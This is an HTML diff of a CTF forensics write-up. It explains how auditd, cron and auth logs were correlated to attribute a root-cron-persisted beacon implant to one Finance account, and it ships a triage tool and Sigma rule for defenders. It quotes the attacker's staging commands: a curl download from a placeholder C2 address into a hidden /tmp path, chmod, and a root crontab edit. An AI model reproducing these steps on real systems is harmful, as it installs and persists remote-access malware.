@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>The Login UID Behind the Beacon - CTF Writeups</title>
+  <link rel="stylesheet" href="/assets/css/site.css?v=20261009-2">
+  <meta name="description" content="I followed a hidden executable from its download and root cron edit to repeated outbound connections, then used the installer&#x27;s login UID to separate one Finance account from a convincing decoy.">
+  <link rel="canonical" href="https://abacusnin.github.io/cyber-ops/ctf-writeups/forensics/auditd-insider-implant/">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Abacus">
+  <meta property="og:title" content="The Login UID Behind the Beacon">
+  <meta property="og:description" content="I followed a hidden executable from its download and root cron edit to repeated outbound connections, then used the installer&#x27;s login UID to separate one Finance account from a convincing decoy.">
+  <meta property="og:url" content="https://abacusnin.github.io/cyber-ops/ctf-writeups/forensics/auditd-insider-implant/">
+  <meta property="og:image" content="https://abacusnin.github.io/assets/og/og-card.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+</head>
+<body class="plain">
+  <div class="wrap">
+    <header class="site-header">
+      <a class="handle" href="/">Abacus</a>
+      <nav class="nav" aria-label="Sections">
+        <a href="/cyber-ops/">Cyber Ops</a>
+        <a href="/grc/">GRC</a>
+        <a href="/intel/">Intel</a>
+        <a href="/ai-ml/">AI/ML</a>
+        <a href="/infra/">Infra</a>
+        <a href="/creative/">Creative</a>
+      </nav>
+    </header>
+    <main>
+      <p class="crumb"><a href="/">Abacus</a> / <a href="/cyber-ops/">Cyber Ops</a> / <a href="/cyber-ops/ctf-writeups/">CTF Writeups</a> / Forensics / <span aria-current="page">The Login UID Behind the Beacon</span></p>
+      <div class="page-head">
+        <h1 class="page-title">The Login UID Behind the Beacon</h1>
+        <p class="lead">The beacon ran as root with no human login UID. The install steps still had one.</p>
+      </div>
+      <div class="layout">
+        <nav class="toc" data-toc aria-label="On this page"></nav>
+        <div class="prose">
+          <p class="tldr-label">Summary</p>
+          <div class="tldr">
+<p><strong>The challenge.</strong> Identify which employee installed a recurring remote-access implant on a Linux application server.</p>
+<p><strong>What I did.</strong> I correlated audit records by event ID, decoded the socket address, checked cron and authentication context, and resolved the installer&#x27;s login UID through the roster.</p>
+<p><strong>The result.</strong> The installation chain pointed to one Finance account. The case is marked Solved; the employee name and submission are withheld.</p>
+<p><strong>The limit.</strong> The host logs and roster are not displayed here. Beaconing supports a C2 hypothesis, while the records shown in the case do not establish the contents or amount of any exfiltrated data.</p>
+          </div>
+<figure class="diagram" id="analysis-flow"><svg viewBox="0 0 360 480" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Outlier; Installer; Persistence; Egress; Attribution; Decision">
+<defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="4" refY="7" orient="auto"><path d="M0,0 L8,0 L4,7 Z" fill="#35e0d0"/></marker></defs>
+<rect x="5" y="5" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="29" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Outlier</text><text x="18" y="49" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Find recurring hidden executable</text>
+<line x1="180" y1="63" x2="180" y2="82" stroke="#35e0d0" stroke-width="1.5" marker-end="url(#arrow)"/>
+<rect x="5" y="85" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="109" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Installer</text><text x="18" y="129" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Join EXECVE and SYSCALL by event ID</text>
+<line x1="180" y1="143" x2="180" y2="162" stroke="#35e0d0" stroke-width="1.5" marker-end="url(#arrow)"/>
+<rect x="5" y="165" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="189" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Persistence</text><text x="18" y="209" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Check root cron edit and runs</text>
+<line x1="180" y1="223" x2="180" y2="242" stroke="#35e0d0" stroke-width="1.5" marker-end="url(#arrow)"/>
+<rect x="5" y="245" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="269" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Egress</text><text x="18" y="289" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Decode AF_INET socket records</text>
+<line x1="180" y1="303" x2="180" y2="322" stroke="#35e0d0" stroke-width="1.5" marker-end="url(#arrow)"/>
+<rect x="5" y="325" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="349" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Attribution</text><text x="18" y="369" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Resolve install auid via roster</text>
+<line x1="180" y1="383" x2="180" y2="402" stroke="#35e0d0" stroke-width="1.5" marker-end="url(#arrow)"/>
+<rect x="5" y="405" width="350" height="58" rx="6" fill="#10141d" stroke="#23293a"/><text x="18" y="429" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#ff4d9d">Decision</text><text x="18" y="449" font-family="ui-monospace,Menlo,monospace" font-size="12" fill="#e6e9f0">Rule out look-alike Finance account</text>
+</svg><figcaption>My checkpoints from the challenge record.</figcaption></figure>
+<h2>Case details</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Category</td>
+<td>DFIR / host log analysis (auditd, syslog, cron, auth)</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Tags</td>
+<td>auditd, login-UID attribution, RAT, C2 beaconing, cron persistence, insider threat, SOCKADDR decode</td>
+</tr>
+<tr>
+<td>Status</td>
+<td>Solved</td>
+</tr>
+<tr>
+<td>Available material</td>
+<td>Linux audit, syslog, cron, and authentication logs plus an account roster</td>
+</tr>
+<tr>
+<td>Goal</td>
+<td>Attribute the implant installation to an employee</td>
+</tr>
+<tr>
+<td>Result</td>
+<td>One installer login UID resolved to one roster identity</td>
+</tr>
+<tr>
+<td>Verification boundary</td>
+<td>No implant binary, network payload, or platform submission record is shown</td>
+</tr>
+</tbody>
+</table>
+<p>Defensive proofs of concept for host-log triage: <a href="https://github.com/AbacusNin/abacusnin.github.io/tree/main/cyber-ops/ctf-writeups/forensics/auditd-insider-implant/artifacts">browse the offline tool, Sigma rule, tests, and checklist on GitHub</a> and <a href="https://github.com/AbacusNin/abacusnin.github.io/tree/main/cyber-ops/ctf-writeups/forensics/auditd-insider-implant/fixtures">the invented audit and cron examples</a>.</p>
+<h2>1. Problem Statement and Threat Scenario</h2>
+<p>I had four logs from one Linux application server and a roster that mapped accounts to employees. The question was personal: which employee put a remote-access implant on the host? The audit log held process and connection records. Syslog, cron, and authentication records could tell me whether the suspicious file kept running and how the installer reached the privileged crontab.</p>
+<p>Two Finance accounts looked worth investigating. One pulled a script from outside the host. The other left a chain that reached a hidden executable, a root cron edit, and repeated outbound connections. I needed the login UID from the installation steps to distinguish them. The later beacon process ran under cron and had no human login UID to give me.</p>
+<details class="fold section-fold">
+<summary>2. Techniques, Tooling, and Actions Taken</summary>
+<p>I inventoried and hashed the logs, then counted the <code>comm</code> values in <code>auditd</code>. <code>git</code>, <code>python3</code>, <code>apt-get</code>, and <code>systemctl</code> made up much of the ordinary activity. A dot-prefixed executable named <code>.upd</code> stood out: it ran more than a thousand times from <code>/tmp/.cache/</code> in the case records.</p>
+<p>I read the relevant <code>EXECVE</code> arguments and joined each one to its <code>SYSCALL</code> record using the audit event ID. That gave me the login UID, session, current UID, and executable context for a download into <code>/tmp/.cache/.upd</code>, a <code>chmod +x</code>, and a <code>crontab -u root -e</code>. A separate <code>USER_CHAUTHTOK</code> entry reported a successful crontab edit. The cron log later showed root running the same path on a schedule. The install actions shared one human login UID and interactive session. The recurring <code>.upd</code> events had <code>auid=4294967295</code>, the unset value.</p>
+<p>The <code>SOCKADDR</code> records let me decode the implant's IPv4 destination. The delivery URL and the later connections named the same host, with different ports. That joined the installation and egress stories. It did not reveal the application protocol or any data body. I resolved the human login UID through the roster only after the log chain held together.</p>
+<p>I also tested the other Finance account. That account fetched and ran <code>monitoring-agent.sh</code>, which was suspicious enough to inspect. I found no matching root cron persistence or repeated connection from the implant path. The download source appeared in the auth log as failed pre-authentication scanning, which did not tie that account to the <code>.upd</code> chain. It remained a decoy for this question.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>3. Tooling and Scripts</summary>
+<p>The useful audit rule keys were <code>cmd_exec</code>, <code>net_connect</code>, and <code>network_tools</code>. I looked at <code>SYSCALL</code>, <code>EXECVE</code>, and <code>SOCKADDR</code> records together. <code>EXECVE</code> held the argument vector; <code>SYSCALL</code> held <code>auid</code>, <code>ses</code>, <code>tty</code>, <code>uid</code>, and <code>euid</code>. Pairing by the event timestamp and serial mattered. Adjacent lines alone do not prove two records describe the same event.</p>
+<p>These quick shell passes helped find the command outlier and the security-relevant arguments. I used event IDs for attribution after that first pass.</p>
+<pre><code class="language-sh">grep -oP 'comm=&quot;[^&quot;]*&quot;' audit.log | sort | uniq -c | sort -rn | head
+grep 'type=EXECVE' audit.log | grep -E 'a0=&quot;(curl|wget|chmod|crontab)&quot;'
+</code></pre>
+<p>The command sequence in the case, with the external address withheld, was:</p>
+<pre><code class="language-text">curl -s -o /tmp/.cache/.upd http://&lt;c2.ip&gt;:8443/update
+chmod +x /tmp/.cache/.upd
+crontab -u root -e
+</code></pre>
+<p>I used a short parser for the socket field. For IPv4 <code>sockaddr_in</code>, the first two bytes name the family, the next two hold the port in network order, and the next four hold the address. The <a href="artifacts/auditd_rat_triage.py">offline triage script</a> includes a bounded version of that decode. It joins audit records by their actual event ID, then checks the install, cron, and egress links against the <a href="fixtures/auditd_sample.log">invented audit sample</a> and <a href="fixtures/cron_sample.log">cron sample</a>. The <a href="artifacts/README.md">guide</a> gives the input contract and limits. It never contacts an endpoint.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>4. Concept Explanation</summary>
+<p>Linux audit events often span several records. <code>SYSCALL</code> describes process context. <code>EXECVE</code> lists arguments. A network event may add <code>SOCKADDR</code>. The audit timestamp and serial bind records from one event. I can read the command from one record and its login UID from the paired record without borrowing identity from the wrong command.</p>
+<p>The <code>auid</code> field is the audit login UID. It normally follows a process tree from the login entry point, including through <code>sudo</code> or <code>su</code>. A cron or daemon process may show it as unset, printed as <code>4294967295</code>. <a href="https://man7.org/linux/man-pages/man7/audit.rules.7.html">Linux audit documentation</a> describes that sentinel. I still have to check collection and privilege history. <a href="https://man7.org/linux/man-pages/man8/auditctl.8.html">The immutable-loginuid setting</a> is an option; I cannot assume every host enabled it or that an <code>auid</code> alone settles person-level attribution.</p>
+<p>The hidden file path mattered because the same path appeared in the download, <code>chmod</code>, cron execution, and later network process. Cron kept the executable running after the interactive session ended. A decoded socket address let me compare the destination with the delivery host. Matching hosts and recurring connections support a command-and-control hypothesis. Traffic content would be needed to show what the process sent.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>5. Exploit / Analysis Mechanics</summary>
+<p>The attribution rests on the installer, not the beacon. The audit record for the download placed a network tool, a hidden output path, a human login UID, and an interactive session together. The same login UID and session covered <code>chmod</code> and the root crontab command. The success record and cron log supplied separate evidence that the schedule was installed and ran the file. Later <code>.upd</code> socket records showed repeated outbound connections with an unset login UID, which fits headless execution.</p>
+<p>The roster mapped the installer login UID to one employee. The other Finance account never touched the implant path in the case record and had no matching persistence or egress. That makes the roster resolution meaningful. A generic count of suspicious commands would have left both accounts in play.</p>
+<p>One gap deserves a hard stop before any real-world person-level conclusion. The installation actions show root <code>uid</code> and <code>euid</code> under a non-privileged login UID, but the provided sequence has no matching <code>sudo</code> or <code>su</code> record. The case labels that as a synthetic-data quirk. On a real host I would reconstruct the privilege transition and verify the login UID policy before treating the roster name as proven. The logs also show beaconing, not an exfiltrated payload. The exercise's exfiltration claim stays an inference.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>6. Lessons Learned</summary>
+<p>Counting executable names gave me a cheap starting point. The useful work began when I followed one file path through the audit event pairs, root cron activity, and outbound sockets. The unset login UID on <code>.upd</code> looked like a dead end until I went back to the install sequence.</p>
+<p>The decoy was useful too. A script pulled from the internet can be concerning, but the second account lacked the rest of the chain. I would not name an insider from an isolated download. The missing privilege transition is another reason to keep the answer bounded to this exercise.</p>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Evidence that helped</th>
+<th>Remaining limit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Who installed the file?</td>
+<td>Shared human <code>auid</code> and session across the install commands</td>
+<td>Privilege transition needs corroboration on a real host</td>
+</tr>
+<tr>
+<td>Did it persist?</td>
+<td>Successful crontab edit plus recurring root cron lines</td>
+<td>Crontab contents should be preserved directly if available</td>
+</tr>
+<tr>
+<td>Did data leave?</td>
+<td>Repeated sockets to the delivery host</td>
+<td>No captured payload, direction, or volume proof</td>
+</tr>
+</tbody>
+</table>
+
+</details>
+<details class="fold section-fold">
+<summary>7. Operational Extrapolation</summary>
+<h3>Individual Practitioner Development</h3>
+<p>This case exercised multi-record audit correlation, login UID attribution, and raw socket decoding. I would next replay the sequence in a controlled Linux lab with audit rules enabled and logs shipped to a SIEM. That would tell me whether the event ID, command-line, and cron fields survive the pipeline the way this analysis needs them.</p>
+<h3>Security Operations</h3>
+<p>The useful detection path is a chain: network utility writes a hidden temporary file, the same login UID changes its permissions and edits root cron, cron runs that path, and the process makes repeated outbound connections. The <a href="artifacts/auditd_rat_triage.py">offline triage tool</a> demonstrates the join on invented records. A <a href="artifacts/sigma_hidden_tmp_download.yml">Sigma rule</a> covers only the first process-creation step. An analyst still needs the <a href="artifacts/detection_triage_checklist.md">full checklist</a>, the crontab, and network telemetry before escalating a person-level or exfiltration claim.</p>
+<h3>Intelligence Operations</h3>
+<p>The hidden path and external address would be useful case observables if they came from a real incident. This exercise's values are sanitized. One host and one chain do not support actor attribution or a campaign report. I would preserve source times, process identity, and the delivery-to-egress relationship before sharing any indicator outside the investigation.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>8. Reusable Tools, Scripts, and Artifacts</summary>
+<p>The <a href="artifacts/auditd_rat_triage.py">read-only audit triage tool</a> takes an audit text file and a cron text file. It emits JSON with a candidate login UID, session, hidden path, delivery IP, beacon count, cron run count, and orphaned <code>EXECVE</code> count. It requires matching event IDs for audit joins, a successful install sequence, a successful crontab edit, at least two root cron runs, and at least two AF_INET connections from that exact path to the delivery host. It handles a bounded subset of Linux audit formats and literal IPv4 URLs.</p>
+<p>The <a href="fixtures/auditd_sample.log">invented audit log</a>, <a href="fixtures/cron_sample.log">cron log</a>, and <a href="fixtures/expected_findings.json">expected finding</a> let a reader run the same check. The <a href="artifacts/test_auditd_rat_triage.py">tests</a> include the complete chain, a second account's unrelated download, missing corroboration, a wrong endpoint, malformed socket data, and normalized process-field examples. Five local test groups passed. The <a href="artifacts/README.md">guide</a> states every input and limit. The <a href="artifacts/detection_triage_checklist.md">ten-step checklist</a> covers the human review that the script cannot perform. The <a href="artifacts/sigma_hidden_tmp_download.yml">Sigma file</a> is a separate, experimental staging signal.</p>
+<pre><code class="language-sh">python -B artifacts/auditd_rat_triage.py fixtures/auditd_sample.log fixtures/cron_sample.log
+cd artifacts
+python -B -m unittest -v test_auditd_rat_triage.py
+</code></pre>
+<p>The tool uses Python's standard library. The optional Sigma-selection test needs PyYAML. These fixtures use invented accounts and a documentation-range address. They support a local lab, not production validation.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>9. Framework Applicability and Mapping</summary>
+<p>Three MITRE ATT&amp;CK mappings fit the recorded chain. The external file transfer aligns with <a href="https://attack.mitre.org/techniques/T1105/">T1105, Ingress Tool Transfer</a>. Dot-prefixed staging aligns with <a href="https://attack.mitre.org/techniques/T1564/001/">T1564.001, Hidden Files and Directories</a>. Recurring root cron execution aligns with <a href="https://attack.mitre.org/techniques/T1053/003/">T1053.003, Cron</a>. These describe the exercise behavior; they do not establish a real campaign.</p>
+<p>I leave two tempting mappings as hypotheses. A socket to a port commonly used for web traffic does not prove <a href="https://attack.mitre.org/techniques/T1071/001/">T1071.001, Web Protocols</a> without protocol evidence. Beaconing alone does not establish <a href="https://attack.mitre.org/techniques/T1041/">T1041, Exfiltration Over C2 Channel</a>. STRIDE's disclosure and privilege concerns can frame a real system review, but this case did not assess a design. OWASP web categories do not fit the host-log task.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>10. Threat Intelligence and Standards Integration</summary>
+<p>I would not publish the sanitized endpoint as a STIX Indicator. It uses a documentation-range address and has no value as a real-world IOC. A STIX attack-pattern or course-of-action object could describe generic behavior, but would add no case-specific intelligence here. No TAXII exchange occurred. The better portable artifact for this record is the <a href="artifacts/README.md">triage logic and its test cases</a>, with exact telemetry requirements and uncertainty visible.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>11. Controls Mapping and Mitigation Realization</summary>
+<h3>Standards Mapping</h3>
+<p>The case shows why <a href="https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final">NIST SP 800-53 Rev. 5</a> AU-2 and AU-12 logging, AU-6 review, SI-4 monitoring, AC-6 least privilege, and CM-7 least functionality would matter to an organization with this host. <a href="https://www.cisecurity.org/controls/cis-controls-navigator/v8">CIS Controls v8</a> 8.5, 8.8, and 8.11 cover detailed logs, command lines, and review; 13.1 covers centralized alerting, and Control 6 covers access management. These are relevance mappings. The exercise does not assess whether any organization implemented or passed those controls.</p>
+<h3>Mitigation Realization</h3>
+<p>I would ship audit event IDs, <code>auid</code>, session, arguments, socket data, cron activity, and privilege changes into a common timeline. Protect the root crontab and alert on changes initiated from a non-admin login UID. Review execution from writable paths, but test whether a <code>/tmp</code> <code>noexec</code> policy fits legitimate workloads before deploying it. Give the SOC a documented way to confirm the path, account, and egress data. The <a href="artifacts/detection_triage_checklist.md">checklist</a> and <a href="artifacts/auditd_rat_triage.py">synthetic triage tool</a> show the review steps; no host policy was deployed or assessed here.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>12. Indicators, Artifacts, and Detection Engineering</summary>
+<p>The useful observables are a network utility writing <code>/tmp/.cache/.upd</code>, a root crontab edit, recurring execution of that path, and connections from it to the delivery host. The path and host in the <a href="fixtures/auditd_sample.log">fixture</a> are invented examples. The <a href="artifacts/sigma_hidden_tmp_download.yml">Sigma rule</a> takes normalized Linux process-creation fields <code>Image</code> and <code>CommandLine</code> and looks only for <code>curl</code> or <code>wget</code> writing a dot-prefixed path beneath <code>/tmp</code>. The <a href="artifacts/test_auditd_rat_triage.py">tests</a> parsed its YAML and exercised the selection against one positive, a plain <code>/tmp</code> updater, a URL-only near miss, and a different utility. I have not converted the rule for a SIEM backend or tested it on live telemetry.</p>
+<p>I did not make a single-event Sigma rule claim to identify a non-admin root-cron edit. That decision needs the audit event join, a trustworthy login UID, a successful edit record, and an administrator inventory. The <a href="artifacts/auditd_rat_triage.py">offline triage tool</a> covers part of that chain with explicit assumptions.</p>
+<p>For the full chain, the <a href="artifacts/auditd_rat_triage.py">offline triage script</a> needs <code>SYSCALL</code> and <code>EXECVE</code> joined by audit event ID, successful crontab edit records, root cron <code>CMD</code> lines, and AF_INET <code>SOCKADDR</code> events with the executable path. It reports a correlated candidate, not a confirmed person or exfiltration event. Legitimate maintenance can write hidden temporary files. Missing audit rules, log loss, a changed login UID, a different network family, or another cron format can hide a real sequence. The <a href="artifacts/README.md">guide</a> gives the exact mapping and the <a href="fixtures/expected_findings.json">expected JSON</a> makes the synthetic result inspectable.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>13. Visual Artifact</summary>
+<p>The <a href="#analysis-flow">flow above</a> follows the case from the unusual executable back to the installer, then forward through root cron and outbound connections. It stops at attribution. I do not draw an exfiltrated payload at the end because the logs did not capture one. The <a href="fixtures/auditd_sample.log">invented audit log</a> and <a href="fixtures/expected_findings.json">expected finding</a> supply a safe, inspectable example of the same join.</p>
+
+</details>
+<details class="fold section-fold">
+<summary>14. References</summary>
+<ul>
+<li><a href="https://man7.org/linux/man-pages/man7/audit.rules.7.html">Linux audit rules manual</a> and <a href="https://man7.org/linux/man-pages/man8/auditctl.8.html">auditctl manual</a>: login UID, unset sentinel, and immutable-loginuid option in Sections 3 through 5.</li>
+<li><a href="https://attack.mitre.org/techniques/T1105/">MITRE ATT&amp;CK T1105</a>, <a href="https://attack.mitre.org/techniques/T1564/001/">T1564.001</a>, and <a href="https://attack.mitre.org/techniques/T1053/003/">T1053.003</a>: supported method mappings in Section 9.</li>
+<li><a href="https://attack.mitre.org/techniques/T1071/001/">MITRE ATT&amp;CK T1071.001</a> and <a href="https://attack.mitre.org/techniques/T1041/">T1041</a>: hypotheses withheld from the observed-technique set in Section 9.</li>
+<li><a href="https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final">NIST SP 800-53 Rev. 5</a> and <a href="https://www.cisecurity.org/controls/cis-controls-navigator/v8">CIS Controls v8</a>: relevance mappings and proposed realizations in Section 11.</li>
+<li><a href="https://sigmahq.io/sigma-specification/specification/sigma-rules-specification.html">Sigma rule specification</a>: the experimental process-creation rule in Section 12.</li>
+</ul>
+</details>
+
+        </div>
+      </div>
+      <a class="backlink" href="/cyber-ops/ctf-writeups/">&lt;- back to writeups</a>
+    </main>
+    <footer class="site-footer">
+      <span>Abacus</span>
+      <span><a href="/credentials/">Credentials</a></span>
+      <span>Contact: <a href="mailto:abacusnin@gmail.com">abacusnin@gmail.com</a></span>
+    </footer>
+  </div>
+  <script src="/assets/js/toc.js?v=20261009-2"></script>
+</body>
+</html>
